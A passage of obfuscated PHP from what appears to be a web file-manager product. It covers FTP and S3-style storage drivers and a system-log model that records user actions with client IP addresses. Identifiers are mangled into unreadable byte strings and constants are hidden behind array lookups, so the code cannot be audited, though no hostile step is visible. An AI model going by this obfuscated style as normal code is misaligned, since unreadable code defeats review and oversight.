$¡œ½ğÙÚ), $¢ŠïÒ»‹[33] => $¢ŠïÒ»‹[78]); if ($è²Ÿ”£æ) { return $éœ»ú ¢; } $éœ»ú ¢[$¢ŠïÒ»‹[231]] = $éœ»ú ¢[$¢ŠïÒ»‹[88]] = 0; $éœ»ú ¢[$¢ŠïÒ»‹[232]] = $éœ»ú ¢[$¢ŠïÒ»‹[233]] = !0; return $éœ»ú ¢; } private function fileInfo($ •´ŸâÌ, $á¨œÏš­ = false, $æĞÖó = array()) { $‰€¡§Æ© =& $_SERVER[©—Ò»ÅĞ]; $“ˆ²˜ëµ = array($‰€¡§Æ©[32] => $this->pathThis($ •´ŸâÌ), $‰€¡§Æ©[87] => $this->getPathOuter($‰€¡§Æ©[8] . $ •´ŸâÌ), $‰€¡§Æ©[33] => $‰€¡§Æ©[230], $‰€¡§Æ©[79] => isset($æĞÖó[$‰€¡§Æ©[79]]) ? $æĞÖó[$‰€¡§Æ©[79]] : 0, $‰€¡§Æ©[166] => $this->ext($ •´ŸâÌ)); if ($á¨œÏš­) { return $“ˆ²˜ëµ; } $“ˆ²˜ëµ[$‰€¡§Æ©[231]] = $“ˆ²˜ëµ[$‰€¡§Æ©[88]] = 0; $“ˆ²˜ëµ[$‰€¡§Æ©[232]] = $“ˆ²˜ëµ[$‰€¡§Æ©[233]] = !0; $Ì—ƒÛõˆ = $this->iconvSystem($ •´ŸâÌ); $“ˆ²˜ëµ[$‰€¡§Æ©[88]] = @ftp_mdtm($this->connect, $Ì—ƒÛõˆ); if (empty($æĞÖó)) { $æĞÖó = $this->objectMeta($ •´ŸâÌ); if (!$æĞÖó) { return $“ˆ²˜ëµ; } } $“ˆ²˜ëµ[$‰€¡§Æ©[79]] = $æĞÖó[$‰€¡§Æ©[79]]; return $“ˆ²˜ëµ; } public function size($ß—º·İ) { $Óè‘Êƒ² = $this->objectMeta($ß—º·İ); return $Óè‘Êƒ² ? $Óè‘Êƒ²[$_SERVER[©—Ò»ÅĞ][79]] : 0; } public function info($Ê€Ä½‹¯) { if ($this->isFile($Ê€Ä½‹¯)) { return $this->fileInfo($Ê€Ä½‹¯, 0); } else { if ($this->isFolder($Ê€Ä½‹¯)) { return $this->folderInfo($Ê€Ä½‹¯); } } return !1; } private function fileList($­•Üíƒ¸, &$ˆĞÃ’Äƒ, &$‹âşª”Ñ, $Àúü°¦ = false) { $’å×³ÎÉ =& $_SERVER[©—Ò»ÅĞ]; $­•Üíƒ¸ = $this->iconvSystem($­•Üíƒ¸); if (!$this->isFolder($­•Üíƒ¸)) { return !1; } $­•Üíƒ¸ = rtrim($­•Üíƒ¸, $’å×³ÎÉ[8]) . $’å×³ÎÉ[8]; check_abort(); $Ÿëï¥ß— = @ftp_rawlist($this->connect, $­•Üíƒ¸); if (!$Ÿëï¥ß—) { $Ÿëï¥ß— = array(); } $Ç”½à„¥ = array($’å×³ÎÉ[10] => 1, $’å×³ÎÉ[1468] => 1); foreach ($Ÿëï¥ß— as $î¯®¿¨„) { $ŒÛ¾‘€É = $this->_listItem($î¯®¿¨„); if ($ŒÛ¾‘€É[0] == $’å×³ÎÉ[859]) { continue; } $àÉÖ¨ş = $ŒÛ¾‘€É[8]; if (empty($àÉÖ¨ş) && $àÉÖ¨ş !== $’å×³ÎÉ[228] || isset($Ç”½à„¥[$àÉÖ¨ş])) { continue; } $àÉÖ¨ş = $this->iconvApp($­•Üíƒ¸ . ltrim($àÉÖ¨ş, $’å×³ÎÉ[8])); $ÑûÈÙìò = array($’å×³ÎÉ[32] => $àÉÖ¨ş, $’å×³ÎÉ[33] => $’å×³ÎÉ[230], $’å×³ÎÉ[79] => $ŒÛ¾‘€É[4]); if (substr($î¯®¿¨„, 0, 1) == $’å×³ÎÉ[1659]) { $ÑûÈÙìò[$’å×³ÎÉ[33]] = $’å×³ÎÉ[78]; $ÑûÈÙìò[$’å×³ÎÉ[79]] = 0; } $Ö¨î¼‹ = $ÑûÈÙìò[$’å×³ÎÉ[33]] == $’å×³ÎÉ[78] ? !0 : !1; $this->cacheMethodInfoSet($àÉÖ¨ş, $Ö¨î¼‹, $ÑûÈÙìò); if ($Ö¨î¼‹) { $ˆĞÃ’Äƒ[] = $àÉÖ¨ş; if ($Àúü°¦) { $this->fileList($àÉÖ¨ş, $ˆĞÃ’Äƒ, $‹âşª”Ñ, $Àúü°¦); } continue; } $‹âşª”Ñ[] = $ÑûÈÙìò; } $this->cacheMethodInfoSet($­•Üíƒ¸, !0); } private function _listItem($‚ø²µÌ¢) { if (empty($‚ø²µÌ¢)) { return array(); } $ãÑ¼ï°¦ = preg_split($_SERVER[©—Ò»ÅĞ][1660], $‚ø²µÌ¢); if (count($ãÑ¼ï°¦) <= 9) { return $ãÑ¼ï°¦; } $ãÑ¼ï°¦[8] = trim(substr($‚ø²µÌ¢, strpos($‚ø²µÌ¢, $ãÑ¼ï°¦[7]) + strlen($ãÑ¼ï°¦[7]))); return array_splice($ãÑ¼ï°¦, 0, 9); } public function listPath($Ò¬ªù—Õ, $²ËÊ®µ¾ = false) { $¸æÛ›‰ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->_isconn()) { return !1; } $ÚğùòãÚ = $ÊÁã®° = array(); $this->fileList($Ò¬ªù—Õ, $ÚğùòãÚ, $ÊÁã®°); foreach ($ÚğùòãÚ as $³šÂç© => $ªĞ¾Ö¤–) { $ÚğùòãÚ[$³šÂç©] = $this->folderInfo($ªĞ¾Ö¤–, $²ËÊ®µ¾); } foreach ($ÊÁã®° as $³šÂç© => $ªĞ¾Ö¤–) { $ÊÁã®°[$³šÂç©] = $this->fileInfo($ªĞ¾Ö¤–[$¸æÛ›‰[32]], $²ËÊ®µ¾, $ªĞ¾Ö¤–); } return array($¸æÛ›‰[85] => $ÚğùòãÚ, $¸æÛ›‰[86] => $ÊÁã®°); } public function has($ğâçÒ‚, $ÍÍˆ–  = false, $›¨¦ÎüĞ = true) { $³©œ¸öì =& $_SERVER[©—Ò»ÅĞ]; $›ÃãÏ· = $Èº¶£ªæ = array(); $ÅÇëú‡­ = $ÍÍˆ–  ? !0 : !1; $this->fileList($ğâçÒ‚, $›ÃãÏ·, $Èº¶£ªæ, $ÅÇëú‡­); if ($ÍÍˆ– ) { return array($³©œ¸öì[239] => count($Èº¶£ªæ), $³©œ¸öì[240] => count($›ÃãÏ·)); } if ($›¨¦ÎüĞ) { if (count($Èº¶£ªæ)) { return !0; } } else { if (count($›ÃãÏ·)) { return !0; } } return !1; } public function listAll($ÅíÙ’êÓ) { $™åİŒ˜ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->_isconn()) { return !1; } $®ôêá°ë = $ÃÛ¬º÷Ú = array(); $this->fileList($ÅíÙ’êÓ, $®ôêá°ë, $ÃÛ¬º÷Ú, !0); $×­š™Ñ‡ = array_to_keyvalue($ÃÛ¬º÷Ú, $™åİŒ˜[32]); foreach ($®ôêá°ë as $Ì¡ä®æ) { if (is_string($Ì¡ä®æ)) { $×­š™Ñ‡[$Ì¡ä®æ] = array($™åİŒ˜[79] => 0); } } return $this->listAllFiles($ÅíÙ’êÓ, $×­š™Ñ‡); } public function getContent($”ÔÑ‹ÓÔ) { if (!$this->_isconn()) { return !1; } $”ÔÑ‹ÓÔ = $this->iconvSystem($”ÔÑ‹ÓÔ); return $this->fileSubstr($”ÔÑ‹ÓÔ); } public function setContent($ÓšÎøµ, $Æ‰«˜Ù— = '') { if (!$this->_isconn()) { return !1; } $À®“ÙÍÁ = $this->pathThis($this->iconvSystem($ÓšÎøµ)); $‹ÇÑÌŸ£ = $this->tempFile($À®“ÙÍÁ); file_put_contents($‹ÇÑÌŸ£, $Æ‰«˜Ù—); $„Ÿó®á­ = $this->upload($ÓšÎøµ, $this->iconvApp($‹ÇÑÌŸ£)); $this->tempFileRemve($‹ÇÑÌŸ£); return $„Ÿó®á­; } public function fileSubstr($²Å˜Á×‚, $äÃ£²Ù· = 0, $¸‹·µ›µ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($²Å˜Á×‚, $äÃ£²Ù·, $¸‹·µ›µ); } private function ftpRequest($È¾—¬±Ø, $Îù°óôÆ = 0, $ğë‡ùİ = false) { $•Œ’æò¹ =& $_SERVER[©—Ò»ÅĞ]; $È¾—¬±Ø = $•Œ’æò¹[8] . ltrim(str_ltrim($È¾—¬±Ø, $this->ftpPath), $•Œ’æò¹[8]); $È¾—¬±Ø = $this->iconvSystem($È¾—¬±Ø); $Û Ôğğ– = $this->scheme . $this->host . $•Œ’æò¹[4] . $this->port; $Ş­ï‹ì¬ = curl_init(); curl_setopt($Ş­ï‹ì¬, CURLOPT_URL, $Û Ôğğ– . $this->pathEncode($È¾—¬±Ø)); curl_setopt($Ş­ï‹ì¬, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ğë‡ùİ) { $ğšªÖà = $Îù°óôÆ + $ğë‡ùİ - 1; curl_setopt($Ş­ï‹ì¬, CURLOPT_RANGE, "{$Îù°óôÆ}\x2d{$ğšªÖà}"); } curl_setopt($Ş­ï‹ì¬, CURLOPT_RETURNTRANSFER, 1); $ÀÖÖÑ§ = curl_exec($Ş­ï‹ì¬); curl_close($Ş­ï‹ì¬); return $ÀÖÖÑ§; } public function upload($ßˆ¦¢€É, $½ßãÀâØ, $·µ“Íƒ = false, $çùÜƒ©ä = REPEAT_REPLACE) { if (!$½ßãÀâØ || !@file_exists($½ßãÀâØ)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ßˆ¦¢€É))) { return !1; } $ßˆ¦¢€É = $this->iconvSystem($ßˆ¦¢€É); $½ßãÀâØ = $this->iconvSystem($½ßãÀâØ); $›‚»ñ³È = ftp_nb_put($this->connect, $ßˆ¦¢€É, $½ßãÀâØ, FTP_BINARY); while ($›‚»ñ³È == FTP_MOREDATA) { $›‚»ñ³È = ftp_nb_continue($this->connect); } if ($›‚»ñ³È != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } return $this->getPathOuter($ßˆ¦¢€É); } public function download($ˆ‚¢•ıÂ, $¢ôÖ©¨‰ = '') { if (!$this->_isconn()) { return !1; } $ƒ°®áäÉ = $this->pathFather($¢ôÖ©¨‰); if (!IO::mkdir($ƒ°®áäÉ)) { return !1; } $ˆ‚¢•ıÂ = $this->iconvSystem($ˆ‚¢•ıÂ); $¢ôÖ©¨‰ = $this->iconvSystem($¢ôÖ©¨‰); $ÃŞÈ˜Ê¯ = ftp_nb_get($this->connect, $¢ôÖ©¨‰, $ˆ‚¢•ıÂ, FTP_BINARY); while ($ÃŞÈ˜Ê¯ == FTP_MOREDATA) { $ÃŞÈ˜Ê¯ = ftp_nb_continue($this->connect); } if ($ÃŞÈ˜Ê¯ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } return $this->iconvApp($¢ôÖ©¨‰); } public function exist($§¨ºÔ´) { return $this->isFile($§¨ºÔ´) || $this->isFolder($§¨ºÔ´); } public function isFile($Ä™÷Ååµ) { return !$this->isFolder($Ä™÷Ååµ) && $this->objectMeta($Ä™÷Ååµ); } public function isFolder($Ì¼Ó•—‰) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][177], $Ì¼Ó•—‰); } protected function objectMeta($˜Öæ¦ô­) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][179], $˜Öæ¦ô­); } protected function _objectMeta($ƒ³ÜÓ„¦) { $ÖÅ•‘¾Å =& $_SERVER[©—Ò»ÅĞ]; if ($ƒ³ÜÓ„¦ == $ÖÅ•‘¾Å[12] || $ƒ³ÜÓ„¦ == $ÖÅ•‘¾Å[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ƒ³ÜÓ„¦ = $this->iconvSystem($ƒ³ÜÓ„¦); $à—ôÓù = array($ÖÅ•‘¾Å[32] => $this->iconvApp($ƒ³ÜÓ„¦), $ÖÅ•‘¾Å[33] => $ÖÅ•‘¾Å[230], $ÖÅ•‘¾Å[79] => 0); $½¶İåà½ = @ftp_size($this->connect, $ƒ³ÜÓ„¦); if ($½¶İåà½ != -1) { $à—ôÓù[$ÖÅ•‘¾Å[79]] = $½¶İåà½; } else { $Æ«”ç‘á = @ftp_chdir($this->connect, $ƒ³ÜÓ„¦); if (!$Æ«”ç‘á) { return !1; } @ftp_chdir($this->connect, $ÖÅ•‘¾Å[8]); $à—ôÓù[$ÖÅ•‘¾Å[33]] = $ÖÅ•‘¾Å[78]; } return $à—ôÓù; } protected function _isFolder($ò¢åÒ“û) { $Ñ¤Ô’ˆó =& $_SERVER[©—Ò»ÅĞ]; if ($ò¢åÒ“û == $Ñ¤Ô’ˆó[12] || $ò¢åÒ“û == $Ñ¤Ô’ˆó[8]) { return !0; } $¢ë×ü = $this->_objectMeta($ò¢åÒ“û); return isset($¢ë×ü[$Ñ¤Ô’ˆó[33]]) && $¢ë×ü[$Ñ¤Ô’ˆó[33]] == $Ñ¤Ô’ˆó[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Ó®”ô„) { parent::__construct($Ó®”ô„); $this->setSignVersion($_SERVER[©—Ò»ÅĞ][247]); } public function uploadLink($‡ğôÀ, $¹¥®Åüö = 0) { $ïŸéãŒŠ =& $_SERVER[©—Ò»ÅĞ]; if ($this->isUploadServer()) { return; } $à« ºä = $this->getType(); if (!in_array($à« ºä, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ø¡Ë×ÇŠ = (!$¹¥®Åüö ? 1 : ceil($¹¥®Åüö / pow(1024, 3))) * 3600 * 4; $œœş©ºÈ = $this->uploadMultiData($‡ğôÀ, $Ø¡Ë×ÇŠ); if ($œœş©ºÈ) { $œœş©ºÈ[$ïŸéãŒŠ[95]] = $‡ğôÀ; $œœş©ºÈ[$ïŸéãŒŠ[96]] = $à« ºä; } return $œœş©ºÈ; } public function fileOutImage($”£×‡è, $§¤—Œ“ = 250) { if ($this->size($”£×‡è) > 1024 * 1024 * 25) { return $this->fileOutImageServer($”£×‡è, $§¤—Œ“); } $íîÕõ = $this->link($”£×‡è); $íîÕõ .= $_SERVER[©—Ò»ÅĞ][1661] . $§¤—Œ“; $this->fileOutLink($íîÕõ); } } goto dŒ‰Ÿçìø·; F’ê…£šĞí: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\145\x72\164", "\146\x75\156\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ü¼¤—™‘ =& $_SERVER[©—Ò»ÅĞ]; return array($Ü¼¤—™‘[2551] => LNG($Ü¼¤—™‘[2552]), $Ü¼¤—™‘[2553] => LNG($Ü¼¤—™‘[2554]), $Ü¼¤—™‘[2129] => LNG($Ü¼¤—™‘[2555]), $Ü¼¤—™‘[2556] => LNG($Ü¼¤—™‘[2557]), $Ü¼¤—™‘[2558] => LNG($Ü¼¤—™‘[2559]), $Ü¼¤—™‘[2560] => LNG($Ü¼¤—™‘[2561]), $Ü¼¤—™‘[2562] => LNG($Ü¼¤—™‘[2563]), $Ü¼¤—™‘[2156] => LNG($Ü¼¤—™‘[2563]), $Ü¼¤—™‘[2157] => LNG($Ü¼¤—™‘[2564]), $Ü¼¤—™‘[2565] => LNG($Ü¼¤—™‘[2566]), $Ü¼¤—™‘[2567] => LNG($Ü¼¤—™‘[2568]), $Ü¼¤—™‘[2569] => LNG($Ü¼¤—™‘[2570]), $Ü¼¤—™‘[2571] => LNG($Ü¼¤—™‘[2572]), $Ü¼¤—™‘[2154] => LNG($Ü¼¤—™‘[2573]), $Ü¼¤—™‘[2574] => LNG($Ü¼¤—™‘[2575]), $Ü¼¤—™‘[2161] => LNG($Ü¼¤—™‘[2576]), $Ü¼¤—™‘[2577] => LNG($Ü¼¤—™‘[2578]), $Ü¼¤—™‘[2579] => LNG($Ü¼¤—™‘[2580]), $Ü¼¤—™‘[2581] => LNG($Ü¼¤—™‘[2582]), $Ü¼¤—™‘[2583] => LNG($Ü¼¤—™‘[2584]), $Ü¼¤—™‘[2163] => LNG($Ü¼¤—™‘[2585]), $Ü¼¤—™‘[2164] => LNG($Ü¼¤—™‘[2586]), $Ü¼¤—™‘[2587] => LNG($Ü¼¤—™‘[2588]), $Ü¼¤—™‘[2589] => LNG($Ü¼¤—™‘[2590]), $Ü¼¤—™‘[2591] => LNG($Ü¼¤—™‘[2592]), $Ü¼¤—™‘[2159] => LNG($Ü¼¤—™‘[2593]), $Ü¼¤—™‘[2594] => LNG($Ü¼¤—™‘[2595]), $Ü¼¤—™‘[2158] => LNG($Ü¼¤—™‘[2596]), $Ü¼¤—™‘[2597] => LNG($Ü¼¤—™‘[2597]), $Ü¼¤—™‘[2598] => LNG($Ü¼¤—™‘[2599]), $Ü¼¤—™‘[2600] => LNG($Ü¼¤—™‘[2597]), $Ü¼¤—™‘[2601] => LNG($Ü¼¤—™‘[2602]), $Ü¼¤—™‘[2603] => LNG($Ü¼¤—™‘[2604]), $Ü¼¤—™‘[2605] => LNG($Ü¼¤—™‘[2604]), $Ü¼¤—™‘[2606] => LNG($Ü¼¤—™‘[2607]), $Ü¼¤—™‘[2608] => LNG($Ü¼¤—™‘[2608]), $Ü¼¤—™‘[2609] => LNG($Ü¼¤—™‘[2133]), $Ü¼¤—™‘[2610] => LNG($Ü¼¤—™‘[2611]), $Ü¼¤—™‘[2612] => LNG($Ü¼¤—™‘[2613]), $Ü¼¤—™‘[2614] => LNG($Ü¼¤—™‘[2615]), $Ü¼¤—™‘[2616] => LNG($Ü¼¤—™‘[2617]), $Ü¼¤—™‘[2618] => LNG($Ü¼¤—™‘[2619]), $Ü¼¤—™‘[2620] => LNG($Ü¼¤—™‘[2620]), $Ü¼¤—™‘[2621] => LNG($Ü¼¤—™‘[2622]), $Ü¼¤—™‘[2623] => LNG($Ü¼¤—™‘[2624]), $Ü¼¤—™‘[2625] => LNG($Ü¼¤—™‘[2626]), $Ü¼¤—™‘[2627] => LNG($Ü¼¤—™‘[2628]), $Ü¼¤—™‘[2629] => LNG($Ü¼¤—™‘[2630]), $Ü¼¤—™‘[2631] => LNG($Ü¼¤—™‘[2632]), $Ü¼¤—™‘[210] => LNG($Ü¼¤—™‘[210]), $Ü¼¤—™‘[211] => LNG($Ü¼¤—™‘[2633]), $Ü¼¤—™‘[2634] => LNG($Ü¼¤—™‘[2634])); } private function typeFile() { $å×Á¤Ë =& $_SERVER[©—Ò»ÅĞ]; $™×ŠÕÃÎ = array($å×Á¤Ë[2161] => array($å×Á¤Ë[2162]), $å×Á¤Ë[2569] => array($å×Á¤Ë[2635]), $å×Á¤Ë[2571] => array($å×Á¤Ë[2636]), $å×Á¤Ë[2154] => array($å×Á¤Ë[2155], $å×Á¤Ë[2637]), $å×Á¤Ë[2579] => array(), $å×Á¤Ë[2581] => array(), $å×Á¤Ë[2583] => array(), $å×Á¤Ë[2163] => array($å×Á¤Ë[2165]), $å×Á¤Ë[2164] => array($å×Á¤Ë[2165]), $å×Á¤Ë[2587] => array($å×Á¤Ë[2638]), $å×Á¤Ë[2589] => array($å×Á¤Ë[2638]), $å×Á¤Ë[2591] => array($å×Á¤Ë[2639]), $å×Á¤Ë[2577] => array($å×Á¤Ë[2640]), $å×Á¤Ë[2159] => array($å×Á¤Ë[2641]), $å×Á¤Ë[2594] => array($å×Á¤Ë[2642]), $å×Á¤Ë[2158] => array($å×Á¤Ë[2160])); return $™×ŠÕÃÎ; } private function typeAll() { $…¿´Î›å =& $_SERVER[©—Ò»ÅĞ]; $®úÌÚ = $this->typeList; $ÓõÈµ¥ = array_filter($this->typeFile()); foreach ($ÓõÈµ¥ as $˜ŞŒşŞ… => $å©´Ÿ˜é) { $®úÌÚ[$å©´Ÿ˜é[0]] = $®úÌÚ[$˜ŞŒşŞ…]; } $®úÌÚ[$…¿´Î›å[2165]] = LNG($…¿´Î›å[2643]); $®úÌÚ[$…¿´Î›å[2638]] = LNG($…¿´Î›å[2644]); return $®úÌÚ; } public function addLog($üóÅû†², $´ğÉ©äØ = array()) { $»öù‚æ” =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->typeList[$üóÅû†²])) { return; } $¸§â¢œ = Session::get($»öù‚æ”[2322]); if (!$¸§â¢œ) { $¸§â¢œ = _get($´ğÉ©äØ, $»öù‚æ”[1592], 0); } if ($üóÅû†² == $»öù‚æ”[2610] && is_array($´ğÉ©äØ[$»öù‚æ”[2645]]) && !$´ğÉ©äØ[$»öù‚æ”[2645]]) { return; } $Œ•Ï½‚‡ = get_client_ip(); if (!$´ğÉ©äØ || strlen(json_encode($´ğÉ©äØ)) >= 1024 * 64) { if ($´ğÉ©äØ && is_array($´ğÉ©äØ)) { $´ğÉ©äØ = array_intersect_key($´ğÉ©äØ, array_flip($»öù‚æ”[487], $»öù‚æ”[32])); $´ğÉ©äØ[$»öù‚æ”[1608]] = $Œ•Ï½‚‡; } else { $´ğÉ©äØ = array($»öù‚æ”[1608] => $Œ•Ï½‚‡); } } else { if (is_array($´ğÉ©äØ)) { $´ğÉ©äØ[$»öù‚æ”[1608]] = $Œ•Ï½‚‡; } else { $´ğÉ©äØ = array($»öù‚æ”[1392] => $´ğÉ©äØ, $»öù‚æ”[1608] => $Œ•Ï½‚‡); } } $´ğÉ©äØ[$»öù‚æ”[2646]] = ACTION; $´ğÉ©äØ = array($»öù‚æ”[1968] => Session::sign(), $»öù‚æ”[1969] => intval($¸§â¢œ), $»öù‚æ”[33] => $üóÅû†², $»öù‚æ”[1971] => json_encode($´ğÉ©äØ)); Hook::trigger($»öù‚æ”[2647], $´ğÉ©äØ); return parent::add($´ğÉ©äØ); } public function remove($«“¼ˆ·) { $this->where(array($_SERVER[©—Ò»ÅĞ][508] => $«“¼ˆ·))->delete(); } private function _makeOrder($Ï¸¯¤²“ = '') { $®²âáŠÍ =& $_SERVER[©—Ò»ÅĞ]; $âêøĞÉ = $®²âáŠÍ[231]; $†Ğ­ğì = array($®²âáŠÍ[537] => $®²âáŠÍ[538], $®²âáŠÍ[539] => $®²âáŠÍ[540]); $î©‰»¾Â = Input::get($®²âáŠÍ[545], $®²âáŠÍ[7], $®²âáŠÍ[2359], array($®²âáŠÍ[2278], $®²âáŠÍ[539])); $î©‰»¾Â = $†Ğ­ğì[$î©‰»¾Â]; $Ï¸¯¤²“ = $Ï¸¯¤²“ . "{$âêøĞÉ}\40{$î©‰»¾Â}"; return $this->order($Ï¸¯¤²“); } public function get($¯ÁŸáñ¾ = '') { $úâÂĞ‰Â =& $_SERVER[©—Ò»ÅĞ]; if (!$¯ÁŸáñ¾) { show_json(array()); } $‡İöÖç = array(); if ($¯ÁŸáñ¾[$úâÂĞ‰Â[1592]]) { $‡İöÖç[$úâÂĞ‰Â[1592]] = $¯ÁŸáñ¾[$úâÂĞ‰Â[1592]]; } if (isset($¯ÁŸáñ¾[$úâÂĞ‰Â[861]])) { $œòªÅ¿ = $¯ÁŸáñ¾[$úâÂĞ‰Â[861]]; $†ïû²ª½ = isset($¯ÁŸáñ¾[$úâÂĞ‰Â[862]]) ? $¯ÁŸáñ¾[$úâÂĞ‰Â[862]] : time(); $‡İöÖç[$úâÂĞ‰Â[231]] = array($úâÂĞ‰Â[408], array($œòªÅ¿, $†ïû²ª½)); } if ($¯ÁŸáñ¾[$úâÂĞ‰Â[33]]) { $§€Ó¦§Ã = explode($úâÂĞ‰Â[50], $¯ÁŸáñ¾[$úâÂĞ‰Â[33]]); $†ı¢ò‚ = $this->typeFile(); $¥¦åÌé = array(); foreach ($§€Ó¦§Ã as $ºéÅğé’) { $¥¦åÌé[] = $ºéÅğé’; if (isset($†ı¢ò‚[$ºéÅğé’])) { $¥¦åÌé = array_merge($¥¦åÌé, $†ı¢ò‚[$ºéÅğé’]); } } $¥¦åÌé = array_unique($¥¦åÌé); if ($¥¦åÌé) { $‡İöÖç[$úâÂĞ‰Â[33]] = array($úâÂĞ‰Â[7], $¥¦åÌé); } } else { $‡İöÖç[$úâÂĞ‰Â[33]] = array($úâÂĞ‰Â[2648], $úâÂĞ‰Â[2649]); } if (!empty($¯ÁŸáñ¾[$úâÂĞ‰Â[1608]])) { $‡İöÖç[$úâÂĞ‰Â[540]] = array($úâÂĞ‰Â[473], "\x25{$¯ÁŸáñ¾[$úâÂĞ‰Â[1608]]}\x25"); } $ÓÜ…ä©‹ = $this->_makeOrder()->where($‡İöÖç)->selectPage(); if (empty($ÓÜ…ä©‹[$úâÂĞ‰Â[446]])) { show_json(array(), !0, $ÓÜ…ä©‹[$úâÂĞ‰Â[443]]); } $ÓÜ…ä©‹[$úâÂĞ‰Â[446]] = $this->logList($ÓÜ…ä©‹[$úâÂĞ‰Â[446]]); return $ÓÜ…ä©‹; } private function ipAddress(&$¯—¼µô¾) { $¼áÑ¶ÊÀ =& $_SERVER[©—Ò»ÅĞ]; if (!empty($¯—¼µô¾[$¼áÑ¶ÊÀ[1608]])) { $©®‰ñãæ = IpLocation::get($¯—¼µô¾[$¼áÑ¶ÊÀ[1608]]); } else { $©®‰ñãæ = LNG($¼áÑ¶ÊÀ[2650]); } $¯—¼µô¾[$¼áÑ¶ÊÀ[2651]] = $©®‰ñãæ; } private function descZipDownload($ÏÏÊ½”, &$˜Á“Â¸²) { $¿ùÔìµ¸ =& $_SERVER[©—Ò»ÅĞ]; if (!isset($ÏÏÊ½”[$¿ùÔìµ¸[1615]])) { return; } $Œ¾ªª²« = json_decode($ÏÏÊ½”[$¿ùÔìµ¸[1615]], !0); foreach ($Œ¾ªª²« as $ÒßØ½“Ï) { try { $¯éĞáµ = IO::infoFullSimple($ÒßØ½“Ï[$¿ùÔìµ¸[87]]); } catch (Exception $İ·£»ÏŒ) { continue; } $ÏÏÊ½”[$¿ùÔìµ¸[87]] = $ÒßØ½“Ï[$¿ùÔìµ¸[87]]; $˜Á“Â¸²[] = $ÏÏÊ½”[$¿ùÔìµ¸[191]] = $¯éĞáµ[$¿ùÔìµ¸[191]]; $˜Á“Â¸²[] = $ÏÏÊ½”[$¿ùÔìµ¸[2419]] = $¯éĞáµ[$¿ùÔìµ¸[190]]; break; } return $ÏÏÊ½”; } private function getSourceList(&$Ó–é³¿›) { $õú·²ùÅ =& $_SERVER[©—Ò»ÅĞ]; $ù›‹ğøï = array(); foreach ($Ó–é³¿› as $›ŞÀ‰±… => $ªœÍÀ¶À) { $Ù÷µ¼ = json_decode($ªœÍÀ¶À[$õú·²ùÅ[540]], !0); if ($ªœÍÀ¶À[$õú·²ùÅ[33]] == $õú·²ùÅ[2157]) { $Ù÷µ¼ = $this->descZipDownload($Ù÷µ¼, $ù›‹ğøï); $Ó–é³¿›[$›ŞÀ‰±…][$õú·²ùÅ[540]] = json_encode($Ù÷µ¼); continue; } if (strpos($ªœÍÀ¶À[$õú·²ùÅ[33]], $õú·²ùÅ[2421]) !== 0) { if (!isset($Ù÷µ¼[$õú·²ùÅ[87]]) || strpos($ªœÍÀ¶À[$õú·²ùÅ[33]], $õú·²ùÅ[2652]) !== 0) { continue; } try { $Ê®Î­“Š = IO::infoFullSimple($Ù÷µ¼[$õú·²ùÅ[87]]); } catch (Exception $Š£×¤¸ö) { continue; } $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[191]] = $Ê®Î­“Š[$õú·²ùÅ[191]]; $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[2419]] = $Ê®Î­“Š[$õú·²ùÅ[190]]; $Ó–é³¿›[$›ŞÀ‰±…][$õú·²ùÅ[540]] = json_encode($Ù÷µ¼); continue; } $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[191]]; $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[2419]]; if ($Ù÷µ¼[$õú·²ùÅ[33]] == $õú·²ùÅ[643]) { $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[540]][$õú·²ùÅ[1346]]; $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[540]][$õú·²ùÅ[1347]]; } if ($Ù÷µ¼[$õú·²ùÅ[33]] == $õú·²ùÅ[2429]) { $ù›‹ğøï[] = $Ù÷µ¼[$õú·²ùÅ[540]][$õú·²ùÅ[191]]; } } if (!$ù›‹ğøï) { return array(); } return Model($õú·²ùÅ[933])->sourceListInfo($ù›‹ğøï, !0); } private function logList($ÇÁõ«“È) { $Ü­ÉÆúÊ =& $_SERVER[©—Ò»ÅĞ]; $‹²„Úšú = array_to_keyvalue($ÇÁõ«“È, $Ü­ÉÆúÊ[12], $Ü­ÉÆúÊ[1592]); $ÎËæÉ­ = Model($Ü­ÉÆúÊ[617])->userListInfo(array_unique($‹²„Úšú)); $í«¯û‘‹ = $this->getSourceList($ÇÁõ«“È); $’øÒ´‹ = $this->typeAll(); $÷Ç¢ª£ã = array(); $ªáïÍõö = array(); foreach ($ÇÁõ«“È as $ñ¨Ã‡˜¼ => $Ó©Øı„¾) { $ŞÙÊğÏ = $Ó©Øı„¾[$Ü­ÉÆúÊ[33]]; $ö¡·€ˆ = isset($ÎËæÉ­[$Ó©Øı„¾[$Ü­ÉÆúÊ[1592]]]) ? $ÎËæÉ­[$Ó©Øı„¾[$Ü­ÉÆúÊ[1592]]] : !1; $¥Ç­®õˆ = strpos($ŞÙÊğÏ, $Ü­ÉÆúÊ[2653]) === 0 ? LNG($Ü­ÉÆúÊ[2654]) : LNG($Ü­ÉÆúÊ[2650]); $Ó©Øı„¾[$Ü­ÉÆúÊ[32]] = 